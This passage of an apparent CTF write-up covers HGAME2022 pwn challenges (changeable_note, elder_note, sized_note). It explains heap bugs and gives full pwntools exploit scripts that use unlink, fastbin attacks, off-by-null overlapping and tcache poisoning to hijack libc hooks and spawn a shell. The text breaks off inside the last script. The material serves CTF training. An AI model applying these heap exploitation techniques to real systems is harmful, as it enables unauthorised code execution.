class="line">lbase = malloc_hook - libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(lbase))</span><br><span class="line"></span><br><span class="line">free_hook = lbase+libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_addr = lbase+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache stashing </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):          <span class="comment">#填满tcache   7  size相同</span></span><br><span class="line">    add(i, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)		<span class="comment">#fast bin</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):          <span class="comment">#清空 tcache</span></span><br><span class="line">    add(i, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x20</span> , p64(free_hook))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x20</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="week3">week3</h2>
<h3 id="changeable-note">changeable_note</h3>
<h4 id="思路-3">思路</h4>
<img src="/HGAME2022-Pwn-wp/image-20220215231334333.png" class="">
<p>​    存在堆溢出，可以伪造 <code>chunk</code> 实现 <code>unlink</code>，让 <code>notes[1] = &amp;notes[1]-0x18</code>，劫持 <code>free</code> 为 <code>puts</code> 从而获得 libc 基址，最后再劫持 <code>atoi</code> 为 <code>system</code> 拿到 <code>shell</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">chunk1     -&gt;</th>
<th style="text-align:center">0</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">0x31</td>
</tr>
<tr>
<td style="text-align:center">fake chunk    -&gt;</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">fake fd   -&gt;</td>
<td style="text-align:center">&amp;notes[1]-0x18</td>
</tr>
<tr>
<td style="text-align:center">fake bk   -&gt;</td>
<td style="text-align:center">&amp;notes[1]-0x10</td>
</tr>
<tr>
<td style="text-align:center">size检查</td>
<td style="text-align:center">0x20</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">chunk2   -&gt;</td>
<td style="text-align:center">0x30</td>
</tr>
<tr>
<td style="text-align:center">prev_inuse 为 0，前一个chunk为 free 状态</td>
<td style="text-align:center">0x90</td>
</tr>
</tbody>
</table>
<h4 id="exp-3">exp</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./note&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">52548</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./note&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line"></span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ptr0 = <span class="number">0x4040C0</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr0+<span class="number">8</span>-<span class="number">0x18</span>)+p64(ptr0+<span class="number">8</span>-<span class="number">0x10</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(f.got[<span class="string">&quot;free&quot;</span>])+p64(f.got[<span class="string">&quot;puts&quot;</span>])+p64(<span class="number">0</span>)+p64(f.got[<span class="string">&quot;atoi&quot;</span>])</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">edit(<span class="number">0</span>,p64(f.plt[<span class="string">&quot;puts&quot;</span>])[<span class="number">0</span>:<span class="number">7</span>])     <span class="comment">#8个字节会覆盖下个函数</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">lbase = leak_addr-libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(lbase))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(lbase+libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="elder-note">elder_note</h3>
<h4 id="思路-4">思路</h4>
<p>​    <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7490">https://xz.aliyun.com/t/7490</a></p>
<p>​	通过 <code>show</code> 功能实现 <code>unsorted bin leak</code> ，<code>delete</code> 中指针未置为0，存在 UAF，可以采用 <code>fastbin attack</code></p>
<img src="/HGAME2022-Pwn-wp/image-20220215233823469.png" class="">
<p>​	<code>fastbin</code> 存在 <code>size</code> 检查，可以利用字节错位绕过 <code>size</code> 域的检测，一般是在 <code>__malloc_hook</code> 附近伪造 chunk （<code>Arbitrary Alloc</code>）</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;__malloc_hook </span><br><span class="line">$<span class="number">1</span> = (void *<span class="comment">(**)</span>(size_t, <span class="keyword">const</span> void *)) <span class="number">0</span>x7f40310f6b10 &lt;__malloc_hook&gt; </span><br><span class="line"></span><br><span class="line">pwndbg&gt; find_fake_fast <span class="number">0</span>x7f40310f6b10 <span class="number">0</span>x7f</span><br><span class="line">FAKE CHUNKS</span><br><span class="line">Fake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: <span class="number">0</span>x7f40310f6aed</span><br><span class="line">prev_size: <span class="number">0</span>x40310f5260000000</span><br><span class="line">size: <span class="number">0</span>x7f</span><br><span class="line">fd: <span class="number">0</span>x4030db7ea0000000</span><br><span class="line">bk: <span class="number">0</span>x4030db7a7000007f</span><br><span class="line">fd_nextsize: <span class="number">0</span>x7f</span><br><span class="line">bk_nextsize: <span class="number">0</span>x00</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p /x <span class="number">0</span>x7f40310f6b10-<span class="number">0</span>x7f40310f6aed</span><br><span class="line">$<span class="number">2</span> = <span class="number">0</span>x23</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​    本来之后劫持 <code>__malloc_hook</code> 为 <code>one_gadget</code> 就可以 <code>get shell</code>，但是这里的 <code>one_gadget</code> 都不满足条件，所以要通过 <code>__realloc_hook</code> 来调整栈帧，劫持 <code>__realloc_hook</code> 为 <code>one_gadget</code></p>
<img src="/HGAME2022-Pwn-wp/image-20220216010136512.png" class="">
<p>​    <code>realloc</code> 函数开头的 <code>push</code> 和 <code>sub rsp,18h</code> 可以调整栈来满足 <code>one_gadget</code> 的使用条件</p>
<img src="/HGAME2022-Pwn-wp/image-20220216010456725.png" class="">
<p>​    <code>__realloc_hook</code> 和 <code>__malloc_hook</code> 邻近，可以一次性劫持</p>
<h4 id="exp-4">exp</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./note2&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">52617</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line"></span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line"><span class="comment">#unsorted bin leak</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x10</span></span><br><span class="line">lbase = malloc_hook-libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(lbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr = lbase+libc.symbols[&quot;system&quot;]</span></span><br><span class="line">one_gadget = lbase+<span class="number">0x4527a</span></span><br><span class="line">realloc_hook = lbase + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;reallock_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">log.info(<span class="string">&quot;ongadget:&quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fastbin attack</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">fake_chunk_addr = malloc_hook-<span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,p64(fake_chunk_addr))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*(<span class="number">0x13</span>-<span class="number">8</span>)+p64(one_gadget)+p64(realloc_hook+<span class="number">0x10</span>)       <span class="comment">#realloc调栈帧</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;6&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="sized-note">sized_note</h3>
<h4 id="思路-5">思路</h4>
<img src="/HGAME2022-Pwn-wp/image-20220215224539479.png" class="">
<img src="/HGAME2022-Pwn-wp/image-20220215224711357.png" class="">
<p>​    add 和 edit 都存在 <code>off-by-null</code>，通过利用可以造成 <code>chunk overlapping</code> ，进而 <code>leak libc</code> 和改写 <code>tcache</code> 的 <code>next</code> 指针</p>
<p>​    <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43409582/article/details/109825038">https://blog.csdn.net/qq_43409582/article/details/109825038</a></p>
<h4 id="chunk-overlapping">chunk overlapping</h4>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/#4extendoverlapping">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/#4extendoverlapping</a></p>
<blockquote>
<p>通过 extend 前向 overlapping：改写 <code>chunk</code> 的 <code>prev_size</code> 域和 <code>prev_inuse</code> 域合并堆块，利用了unlink 机制，<strong>可以跨越多个堆块进行合并</strong></p>
</blockquote>
<blockquote>
<p>通过 extend 后向 overlapping：改写 <code>size</code> 域实现 <code>overlapping</code></p>
</blockquote>
<h4 id="exp-5">exp</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./note3&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">52863</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./note3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line"></span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):         </span><br><span class="line">    add(i, <span class="number">0xf8</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):          <span class="comment">#填满tcache   7  size相同</span></span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x20</span>,<span class="string">&quot;protect&quot;</span>)		<span class="comment">#防止合并</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)       <span class="comment">#unsorted bin       chunk0</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x100</span>*<span class="number">2</span>))		<span class="comment">#chunk overlapping    chunk1</span></span><br><span class="line">delete(<span class="number">9</span>)						<span class="comment">#chunk2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):          <span class="comment">#清空tcache</span></span><br><span class="line">    add(i, <span class="number">0xf8</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0xf8</span>,<span class="string">&quot;a&quot;</span>)       <span class="comment">#chunk0</span></span><br><span class="line">show(<span class="number">8</span>)					<span class="comment">#chunk1</span></span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">lbase = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system_addr = lbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = lbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(lbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache poisoning</span></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)		<span class="comment">#chunk1</span></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(free_hook))	<span class="comment">#uaf</span></span><br><span class="line">add(<span class="number">12</span>, <span class="number">0xf8</span>, <span 